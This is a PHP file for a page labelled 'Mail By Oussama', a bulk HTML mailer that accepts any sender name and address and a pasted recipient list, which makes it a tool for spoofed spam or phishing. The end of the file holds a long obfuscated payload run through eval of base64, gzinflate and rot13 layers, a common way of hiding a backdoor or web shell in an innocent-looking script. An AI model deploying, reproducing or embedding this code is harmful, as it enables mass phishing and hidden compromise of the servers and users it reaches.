<?php
if (isset($_POST['ajax'])) {
$to = $_POST['to'];
$subject = $_POST['sub'];
$msg = $_POST['msg'];
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: ".$_POST['name']."<".$_POST['from'].">";

$send = mail($to,$subject,$msg,$headers);

if ($send) {
	echo "<p id='success'>✔️  $to</p>";
}else{
	echo "<p id='error'>❌  $to</p>";
}
exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link href="https://fonts.googleapis.com/css?family=Montserrat|Roboto" rel="stylesheet">
	<link rel="icon" href="https://i.imgur.com/5ivJdmN.png">
	<title>Mail By Oussama</title>
	<style>
	body{
		margin: 0;
		padding: 0;
		background-color: #080808;
	}
	::placeholder {
    	color: red;
    	opacity: .9;
    	font-size: 15px!important;
	}
	.main{
		max-width: 768px;
		margin: 0 auto;
	}
	#title{
		color: lime;
	    text-shadow: 0 0 20px lime;
		text-align: center;
		font-family: Montserrat;
	}
	input[type="text"]{
		background-color: #000;
		box-shadow: 0 0 11px 0px lime;
		height: 40px;
		width: 47%;
		border: none;
		border-radius: 4px;
		padding: 15px;
		margin: 1%;
		box-sizing: border-box;
		outline: none;
		transition: .5s ease-in;
		color: red;
		font-family: Montserrat;
		font-size: 14px;
	}
	input[type="text"]:hover{
		box-shadow: 0 0 11px 0px red;
	}
	#sub{
		width: 96.5%;
	}
	textarea{
		background-color: #000;
		box-shadow: 0 0 11px 0px lime;
		height: 300px;
    	width: 47%;
    	max-width: 49%;
		border: none;
		border-radius: 4px;
		padding: 15px;
		margin: 1%;
		box-sizing: border-box;
		outline: none;
		transition: .5s ease-in;
		color: red;
		font-family: Montserrat;
		font-size: 14px;
	}
	textarea:hover{
		box-shadow: 0 0 11px 0px red;
	}
	#btn{
		background-color: #000;
		box-shadow: 0 0 11px 0px lime;
		width: 96.5%;
		height: 40px;
	    margin-left: 5px;
		margin-bottom: 40px;
		color: lime;
		border: none;
		border-radius: 4px;
		font-family: Montserrat;
		font-size: 18px;
		font-weight: bold;
		letter-spacing: 1px;
		box-sizing: border-box;
		outline: none;
		transition: .5s ease-in;
		cursor: pointer;
	}
	#btn:hover{
		color: red;
	}
	#success{
		font-family: Montserrat;
		color: green;
	}
	#error{
		font-family: Montserrat;
		color: red;
	}
	</style>
</head>
<body>
<form action="" method="post">
<div class="main" style="margin-top: 100px;">
	<h1 id="title">Mail Oussama</h1>
	<div>
		<input type="text" name="from" id="from" placeholder="From Email">
		<input type="text" name="name" id="name" placeholder="From Name">
	</div><br>
	<div>
		<input type="text" name="sub" id="sub" placeholder="Subject">
	</div><br>
	<div>
		<textarea name="msg" id="msg" placeholder="Message"></textarea>
		<textarea name="to" id="to" placeholder="Mailist"></textarea>
	</div>
	<div><br><br>
		<button id="btn" onclick="return false">SEND</button>
	</div>
	<div id="result"></div>
</div>
</form>
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<script type="text/javascript">
$(document).ready(function(){
	$("#btn").on('click',function(){
		var mailist = $("#to").val().split("\n");
		var tmailist =  mailist.length;
		for (var current = 0; current < tmailist; current++) {
		var from = $("#from").val();
		var name = $("#name").val();
		var sub = $("#sub").val();
		var msg = $("#msg").val();
		var to = mailist[current];
		var data = "ajax=1&from=" + from + "&name=" + name + "&sub=" + sub + "&msg=" + msg + "&to=" + to;
			$.ajax({
				type : 'POST',
				data:  data,
				success: function(data) {
	                $("#result").append(data);
	            }
			});
		}


	});
});
</script>
</body>
</html>
<?php
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
?>